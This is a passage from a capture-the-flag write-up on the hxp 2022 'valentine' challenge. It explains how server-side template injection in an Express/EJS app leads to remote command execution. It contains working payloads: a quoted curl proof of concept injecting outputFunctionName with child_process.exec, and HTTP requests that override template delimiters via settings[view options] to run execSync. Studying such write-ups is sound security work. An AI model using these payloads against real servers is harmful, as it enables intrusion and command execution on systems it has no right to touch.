<p>Among the various options supported by EJS, some of them allow <strong>overwriting the characters used</strong> by the template <strong>as the delimiters</strong>.</p>

<blockquote class="attention">
  <p>If we manage to pass those values to the render method, <strong>we can set a completely different placeholder</strong> that will pass all the security checks, remaining however a valid template variable.</p>
</blockquote>

<p>The EJS‚Äôs render methods <sup id="fnref:2"><a href="#fn:2" class="footnote" rel="footnote" role="doc-noteref">2</a></sup> accepts those options as a third argument, but the render method used by the application is the one defined inside Express <sup id="fnref:3"><a href="#fn:3" class="footnote" rel="footnote" role="doc-noteref">3</a></sup>, which accepts a <code class="language-plaintext highlighter-rouge">locals</code> object as a second argument and which later calls the EJS‚Äôs <code class="language-plaintext highlighter-rouge">renderFile()</code> method.</p>

<p>Keeping in mind that the challenge passes a full user-controllable variable to the render method and that we already discovered that we can also pass objects instead of strings to the server, this path seems promising.</p>

<p>The final clue arrives from different articles related to some older EJS vulnerabilities.</p>

<h4 id="old-vulnerabilities"><span class="me-2">Old vulnerabilities</span><a href="#old-vulnerabilities" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4>

<p>This Snyk‚Äôs article from 2016 <sup id="fnref:4"><a href="#fn:4" class="footnote" rel="footnote" role="doc-noteref">4</a></sup> shows that options and data can be passed together using the same object.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="nx">ejs</span><span class="p">.</span><span class="nf">renderFile</span><span class="p">(</span><span class="dl">'</span><span class="s1">my-template</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">root</span><span class="p">:</span><span class="dl">'</span><span class="s1">/bad/root/</span><span class="dl">'</span><span class="p">},</span> <span class="nx">callback</span><span class="p">);</span>
</pre></td></tr></tbody></table></code></div></div>

<p>This feature is also confirmed inside the official EJS documentation <sup id="fnref:5"><a href="#fn:5" class="footnote" rel="footnote" role="doc-noteref">5</a></sup>, but it will not work anymore for unsafe options like the one shown by Snyk.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
  <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="p">{</span><span class="na">foo</span><span class="p">:</span> <span class="dl">'</span><span class="s1">FOO</span><span class="dl">'</span><span class="p">,</span> <span class="na">delimiter</span><span class="p">:</span> <span class="dl">'</span><span class="s1">?</span><span class="dl">'</span><span class="p">});</span>
<span class="p">});</span>
</pre></td></tr></tbody></table></code></div></div>

<p>We can try passing some options as separate fields or even as object properties, but it doesn‚Äôt produce any result.</p>

<blockquote class="danger">
  <p>You can read why it didn‚Äôt work at the chapter <a href="http://localhost:4000/writeups/Web%20Hacking/valentine/#cache-and-custom-delimiters">Cache and custom delimiters</a></p>
</blockquote>

<p><a href="/assets/img/valentine/valentine6.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine6.png" alt="" loading="lazy"></a></p>

<p>This other article from the GitHub security lab <sup id="fnref:6"><a href="#fn:6" class="footnote" rel="footnote" role="doc-noteref">6</a></sup> completely caught my attention. It talks about an RCE vulnerability in EJS, and the vulnerable code used as a sample has the same features as our challenge. The PoC provided is also very similar to the one we were creating, but it was created for EJS 3.1.5, while the version we are using is the 3.1.8.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre></td><td class="rouge-code"><pre><span class="kd">const</span> <span class="nx">express</span> <span class="o">=</span> <span class="nf">require</span><span class="p">(</span><span class="dl">'</span><span class="s1">express</span><span class="dl">'</span><span class="p">)</span>
<span class="kd">const</span> <span class="nx">app</span> <span class="o">=</span> <span class="nf">express</span><span class="p">()</span>
<span class="kd">const</span> <span class="nx">port</span> <span class="o">=</span> <span class="mi">3000</span>
 
<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">views</span><span class="dl">'</span><span class="p">,</span> <span class="nx">__dirname</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">set</span><span class="p">(</span><span class="dl">'</span><span class="s1">view engine</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">ejs</span><span class="dl">'</span><span class="p">);</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">use</span><span class="p">(</span><span class="nx">express</span><span class="p">.</span><span class="nf">urlencoded</span><span class="p">({</span> <span class="na">extended</span><span class="p">:</span> <span class="kc">false</span> <span class="p">}));</span>
<span class="nx">app</span><span class="p">.</span><span class="nf">get</span><span class="p">(</span><span class="dl">'</span><span class="s1">/</span><span class="dl">'</span><span class="p">,</span> <span class="p">(</span><span class="nx">req</span><span class="p">,</span> <span class="nx">res</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
   <span class="nx">res</span><span class="p">.</span><span class="nf">render</span><span class="p">(</span><span class="dl">'</span><span class="s1">index</span><span class="dl">'</span><span class="p">,</span> <span class="nx">req</span><span class="p">.</span><span class="nx">query</span><span class="p">)</span>
<span class="p">})</span>
 
<span class="nx">app</span><span class="p">.</span><span class="nf">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="p">})</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">app</span><span class="p">;</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Proof of concept should create a file via touch named /tmp/GHSLPayload:</p>

<div class="language-bash highlighter-rouge"><div class="code-header">
        <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre>curl <span class="s1">'http://localhost:3000/?message=foo&amp;settings\[view%20options\]\[outputFunctionName\]=x%3Bprocess.mainModule.require(%27child_process%27).exec(%27bash%20-c%20%22touch%20%2Ftmp%2FGHSLPayload%22%27)%3Bx'</span>
</pre></td></tr></tbody></table></code></div></div>

<p>If we try the PoC against our server it doesn‚Äôt work, but it is still a great indicator that we are close to the solution.</p>

<h3 id="undocumented-ejs-shallowcopy"><span class="me-2">Undocumented EJS shallowCopy</span><a href="#undocumented-ejs-shallowcopy" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The final illumination comes from this EJS Server Side Template Injection writeup <sup id="fnref:7"><a href="#fn:7" class="footnote" rel="footnote" role="doc-noteref">7</a></sup> which exploited prototype pollution in the library.</p>

<p>The article digs down into the EJS source code, showing why the <code class="language-plaintext highlighter-rouge">data</code> and the <code class="language-plaintext highlighter-rouge">options</code> are merged, but most importantly, pointing us to an <strong>old undocumented feature</strong> that we can still use in the later version: the <code class="language-plaintext highlighter-rouge">view options</code>.</p>

<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
</pre></td><td class="rouge-code"><pre><span class="kd">var</span> <span class="nx">_OPTS_PASSABLE_WITH_DATA</span> <span class="o">=</span> <span class="p">[</span><span class="dl">'</span><span class="s1">delimiter</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">scope</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">context</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">debug</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">compileDebug</span><span class="dl">'</span><span class="p">,</span>
  <span class="dl">'</span><span class="s1">client</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">_with</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">rmWhitespace</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">strict</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">filename</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">async</span><span class="dl">'</span><span class="p">];</span>
<span class="p">...</span>
<span class="nx">exports</span><span class="p">.</span><span class="nx">render</span> <span class="o">=</span> <span class="nf">function </span><span class="p">(</span><span class="nx">template</span><span class="p">,</span> <span class="nx">d</span><span class="p">,</span> <span class="nx">o</span><span class="p">)</span> <span class="p">{</span>
  <span class="kd">var</span> <span class="nx">data</span> <span class="o">=</span> <span class="nx">d</span> <span class="o">||</span> <span class="p">{};</span>
  <span class="kd">var</span> <span class="nx">opts</span> <span class="o">=</span> <span class="nx">o</span> <span class="o">||</span> <span class="p">{};</span>

  <span class="c1">// No options object -- if there are optiony names</span>
  <span class="c1">// in the data, copy them to options</span>
  <span class="k">if </span><span class="p">(</span><span class="nx">arguments</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
    <span class="nx">utils</span><span class="p">.</span><span class="nf">shallowCopyFromList</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">data</span><span class="p">,</span> <span class="nx">_OPTS_PASSABLE_WITH_DATA</span><span class="p">);</span>
  <span class="p">}</span>

  <span class="k">return</span> <span class="nf">handleCache</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">template</span><span class="p">)(</span><span class="nx">data</span><span class="p">);</span>
<span class="p">};</span>
<span class="p">...</span>
<span class="nx">exports</span><span class="p">.</span><span class="nx">renderFile</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
	<span class="p">...</span>
	<span class="c1">// Undocumented after Express 2, but still usable, esp. for</span>
	<span class="c1">// items that are unsafe to be passed along with data, like `root`</span>
	<span class="nx">viewOpts</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">settings</span><span class="p">[</span><span class="dl">'</span><span class="s1">view options</span><span class="dl">'</span><span class="p">];</span>
	<span class="k">if </span><span class="p">(</span><span class="nx">viewOpts</span><span class="p">)</span> <span class="p">{</span>
	    <span class="nx">utils</span><span class="p">.</span><span class="nf">shallowCopy</span><span class="p">(</span><span class="nx">opts</span><span class="p">,</span> <span class="nx">viewOpts</span><span class="p">);</span>
	<span class="p">}</span>
<span class="p">...</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Migrating from Express 2.x to 3.x <sup id="fnref:8"><a href="#fn:8" class="footnote" rel="footnote" role="doc-noteref">8</a></sup>, the <code class="language-plaintext highlighter-rouge">view options</code> mutated into <code class="language-plaintext highlighter-rouge">app.locals</code>, but was not removed from the source code!</p>

<blockquote class="bug">
  <p>By calling the <code class="language-plaintext highlighter-rouge">renderFile</code> function and passing a single object containing a <code class="language-plaintext highlighter-rouge">settings</code> property containing itself the <code class="language-plaintext highlighter-rouge">view options</code> property, we can bypass the¬†<code class="language-plaintext highlighter-rouge">_OPTS_PASSABLE_WITH_DATA</code>¬†filter and overwrite all the properties we want.</p>
</blockquote>

<p>At this point, we can create a template that uses custom delimiters containing a simple command execution, so that the <code class="language-plaintext highlighter-rouge">while</code> loop searching for the single allowed placeholder is bypassed:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
</pre></td><td class="rouge-code"><pre>POST /template
Host: 127.0.0.1:9086
Content-Type: application/x-www-form-urlencoded

tmpl=foo [.= process.mainModule.require('child_process').execSync('echo pippo').toString() .] bar&amp;name=asd
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/valentine/valentine7.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine7.png" alt="" loading="lazy"></a></p>

<p>Then we can request that template passing the¬†<code class="language-plaintext highlighter-rouge">settings[view options]</code>¬†fields with the new desired delimiters:</p>

<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>GET /991a04f8-fecd-42f9-af93-31d29f13420c?name=asd&amp;settings[view%20options][delimiter]=%2e&amp;settings[view%20options][openDelimiter]=%5b&amp;settings[view%20options][closeDelimiter]=%5d
Host: 127.0.0.1:9086
</pre></td></tr></tbody></table></code></div></div>

<p><a href="/assets/img/valentine/valentine8.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine8.png" alt="" loading="lazy"></a></p>

<p>Finally we did it! We have remote command execution and we can exfiltrate the flag, either by showing it on the screen, or by using OAST techniques.</p>

<p><a href="/assets/img/valentine/valentine9.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine9.png" alt="" loading="lazy"></a>
<a href="/assets/img/valentine/valentine10.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine10.png" alt="" loading="lazy"></a></p>

<h3 id="cache-and-custom-delimiters"><span class="me-2">Cache and custom delimiters</span><a href="#cache-and-custom-delimiters" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3>

<p>The intended solution <sup id="fnref:9"><a href="#fn:9" class="footnote" rel="footnote" role="doc-noteref">9</a></sup> was not so different from the one we adopted, and to be honest, we came across it but didn‚Äôt get it because of a simple but dangerous error.</p>

<p>During the analysis, we did not consider that the server was configured to run in production mode and that Express, therefore, had caching enabled.</p>

<p>Dockerfile:</p>
<div class="language-Dockerfile highlighter-rouge"><div class="code-header">
        <span data-label-text="Dockerfile"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre></td><td class="rouge-code"><pre><span class="k">ENV</span><span class="s"> NODE_ENV=production</span>
</pre></td></tr></tbody></table></code></div></div>

<p>Express.js:</p>
<div class="language-js highlighter-rouge"><div class="code-header">
        <span data-label-text="JavaScript"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre></td><td class="rouge-code"><pre><span class="k">if </span><span class="p">(</span><span class="nx">env</span> <span class="o">===</span> <span class="dl">'</span><span class="s1">production</span><span class="dl">'</span><span class="p">)</span> <span class="p">{</span>
  <span class="k">this</span><span class="p">.</span><span class="nf">enable</span><span class="p">(</span><span class="dl">'</span><span class="s1">view cache</span><span class="dl">'</span><span class="p">);</span>
<span class="p">}</span>
</pre></td></tr></tbody></table></code></div></div>

<p>When we sent the custom delimiter in the query string, we didn‚Äôt get back any valid result because <strong>the server had already cached the view with the un-modified delimiter</strong> since the first time we requested the template. If we try passing the delimiter field <strong>the first time we access the template</strong>, we obtain the same result achieved using the view options element.</p>

<p>Template:
<a href="/assets/img/valentine/valentine11.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine11.png" alt="" loading="lazy"></a></p>

<p>Request intercepted before visiting the first time the view:</p>
<div class="language-plaintext highlighter-rouge"><div class="code-header">
        <span data-label-text="Plaintext"><i class="fas fa-code fa-fw small"></i></span>
      <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
</pre></td><td class="rouge-code"><pre>GET /991a04f8-fecd-42f9-af93-31d29f13420c?name=maoutis&amp;delimiter=.
Host: 127.0.0.1:9086
</pre></td></tr></tbody></table></code></div></div>
<p><a href="/assets/img/valentine/valentine12.png" class="popup img-link shimmer"><img src="/assets/img/valentine/valentine12.png" alt="" loading="lazy"></a></p>

<p>We overcomplicated the challenge, but it was a nice journey.</p>

<h2 id="flag"><span class="me-2">Flag</span><a href="#flag" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2>

<blockquote class="success">
  <p><code class="language-plaintext highlighter-rouge">hxp{W1ll_u_b3_my_V4l3nt1ne?}</code></p>
</blockquote>
<div class="footnotes" role="doc-endnotes">
  <ol>
    <li id="fn:1">
      <p><a href="https://ejs.co/#docs">https://ejs.co/#docs</a>¬†<a href="#fnref:1" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:2">
      <p><a href="https://ejs.co/#docs">https://ejs.co/#docs</a>¬†<a href="#fnref:2" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:3">
      <p><a href="https://expressjs.com/en/api.html#res.render">https://expressjs.com/en/api.html#res.render</a>¬†<a href="#fnref:3" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:4">
      <p><a href="https://snyk.io/blog/fixing-ejs-rce-vuln/">https://snyk.io/blog/fixing-ejs-rce-vuln/</a>¬†<a href="#fnref:4" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:5">
      <p><a href="https://github.com/mde/ejs/wiki/Using-EJS-with-Express#passing-opts-with-data">https://github.com/mde/ejs/wiki/Using-EJS-with-Express#passing-opts-with-data</a>¬†<a href="#fnref:5" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:6">
      <p><a href="https://securitylab.github.com/advisories/GHSL-2021-021-tj-ejs/">https://securitylab.github.com/advisories/GHSL-2021-021-tj-ejs/</a>¬†<a href="#fnref:6" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:7">
      <p><a href="https://eslam.io/posts/ejs-server-side-template-injection-rce/">https://eslam.io/posts/ejs-server-side-template-injection-rce/</a>¬†<a href="#fnref:7" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:8">
      <p><a href="https://github.com/expressjs/express/wiki/Migrating-from-2.x-to-3.x">https://github.com/expressjs/express/wiki/Migrating-from-2.x-to-3.x</a>¬†<a href="#fnref:8" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
    <li id="fn:9">
      <p><a href="https://hxp.io/blog/101/hxp-CTF-2022-valentine/">https://hxp.io/blog/101/hxp-CTF-2022-valentine/</a>¬†<a href="#fnref:9" class="reversefootnote" role="doc-backlink">&#8617;&#xfe0e;</a></p>
    </li>
  </ol>
</div>

  </div>

  <div class="post-tail-wrapper text-muted">
    <!-- categories -->
    
      <div class="post-meta mb-3">
        <i class="far fa-folder-open fa-fw me-1"></i>
        
          <a href="/categories/articles-writeups/">Articles & Writeups</a>,
          <a href="/categories/web-hacking/">Web Hacking</a>
      </div>
    

    <!-- tags -->
    
      <div class="post-tags">
        <i class="fa fa-tags fa-fw me-1"></i>
        
          <a
            href="/tags/hxp-ctf/"
            class="post-tag no-text-decoration"
          >hxp-ctf</a>
        
          <a
            href="/tags/javascript/"
            class="post-tag no-text-decoration"
          >javascript</a>
        
      </div>
    

    <div
      class="
        post-tail-bottom
        d-flex justify-content-between align-items-center mt-5 pb-2
      "
    >
      <div class="license-wrapper">
        
          

          This post is licensed under 
        <a href="https://creativecommons.org/licenses/by/4.0/">
          CC BY 4.0
        </a>
         by the author.
        
      </div>

      <!-- Post sharing snippet -->

<div class="share-wrapper d-flex align-items-center">
  <span class="share-label text-muted">Share</span>
  <span class="share-icons">
    
    
    

    

      

      <a href="https://twitter.com/intent/tweet?text=Finding%20SSTI%20in%20an%20EJS%20app%20using%20existing%20exploits%20and%20undocumented%20features%20-%200xbro&url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fssti-in-ejs-app-using-undocumented-features%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Twitter" aria-label="Twitter">
        <i class="fa-fw fa-brands fa-square-x-twitter"></i>
      </a>
    

      

      <a href="https://www.facebook.com/sharer/sharer.php?title=Finding%20SSTI%20in%20an%20EJS%20app%20using%20existing%20exploits%20and%20undocumented%20features%20-%200xbro&u=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fssti-in-ejs-app-using-undocumented-features%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Facebook" aria-label="Facebook">
        <i class="fa-fw fab fa-facebook-square"></i>
      </a>
    

      

      <a href="https://t.me/share/url?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fssti-in-ejs-app-using-undocumented-features%2F&text=Finding%20SSTI%20in%20an%20EJS%20app%20using%20existing%20exploits%20and%20undocumented%20features%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Telegram" aria-label="Telegram">
        <i class="fa-fw fab fa-telegram"></i>
      </a>
    

      

      <a href="https://www.linkedin.com/feed/?shareActive=true&shareUrl=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fssti-in-ejs-app-using-undocumented-features%2F" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Linkedin" aria-label="Linkedin">
        <i class="fa-fw fab fa-linkedin"></i>
      </a>
    

      

      <a href="https://www.reddit.com/submit?url=http%3A%2F%2Flocalhost%3A4000%2Fposts%2Fssti-in-ejs-app-using-undocumented-features%2F&title=Finding%20SSTI%20in%20an%20EJS%20app%20using%20existing%20exploits%20and%20undocumented%20features%20-%200xbro" target="_blank" rel="noopener" data-bs-toggle="tooltip" data-bs-placement="top" title="Reddit" aria-label="Reddit">
        <i class="fa-fw fa-brands fa-square-reddit"></i>
      </a>
    

    <button
      id="copy-link"
      aria-label="Copy link"
      class="btn small"
      data-bs-toggle="tooltip"
      data-bs-placement="top"
      title="Copy link"
      data-title-succeed="Link copied successfully!"
    >
      <i class="fa-fw fas fa-link pe-none fs-6"></i>
    </button>
  </span>
</div>

    </div>
    <!-- .post-tail-bottom -->
  </div>
  <!-- div.post-tail-wrapper -->
</article>


            
          </main>

          <!-- panel -->
          <aside aria-label="Panel" id="panel-wrapper" class="col-xl-3 ps-2 text-muted">
            <div class="access">
              <!-- Get 5 last posted/updated posts -->














  <section id="access-lastmod">
    <h2 class="panel-heading">Recently Updated</h2>
    <ul class="content list-unstyled ps-0 pb-1 ms-1 mt-2">
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/how-i-keep-updated/">How I keep updated in the infosec industry</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/vtenext-25-02-a-three-way-path-to-rce/">Vtenext 25.02 vulnerability research</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/wp-prevent-direct-access-CVE-2025-3861/">Incorrect Authorization to Authenticated (Contributor+) Multiple Media Actions in Prevent Direct Access Wordpress Plugin (CVE-2025-3861)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/effective-notes-with-obsidian/">Effective Notes for OSCP, CTFs and Pentests with Obsidian (2025)</a>
        </li>
      
        
        
        
        <li class="text-truncate lh-lg">
          <a href="/posts/salesforce-hacking/">Pentesting Salesforce Communities</a>
        </li>
      
    </ul>
  </section>
  <!-- #access-lastmod -->


              <!-- The trending tags list -->















  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
      
        
        

  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        

  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
  
    
    
    
    
      
        
        



  <section>
    <h2 class="panel-heading">Trending Tags</h2>
    <div class="d-flex flex-wrap mt-3 mb-1 me-3">
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hackthebox/">hackthebox</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/deserialization/">deserialization</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/android/">android</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/php/">PHP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/interview/">interview</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/oscp/">OSCP</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/podcast/">podcast</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/ato/">ATO</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/hacking-lab/">hacking-lab</a>
      
        
        <a class="post-tag btn btn-outline-primary" href="/tags/note-taking/">note-taking</a>
      
    </div>
  </section>


            </div>

            
              
              






  <div class="toc-border-cover z-3"></div>
  <section id="toc-wrapper" class="invisible position-sticky ps-0 pe-4 pb-4">
    <h2 class="panel-heading ps-3 pb-2 mb-0">Contents</h2>
    <nav id="toc"></nav>
  </section>


            
          </aside>
        </div>

        <div class="row">
          <!-- tail -->
          <div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 px-md-4">
            
              
              <!-- Recommend the other 3 posts according to the tags and categories of the current post. -->

<!-- The total size of related posts -->


<!-- An random integer that bigger than 0 -->


<!-- Equals to TAG_SCORE / {max_categories_hierarchy} -->















  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  

  
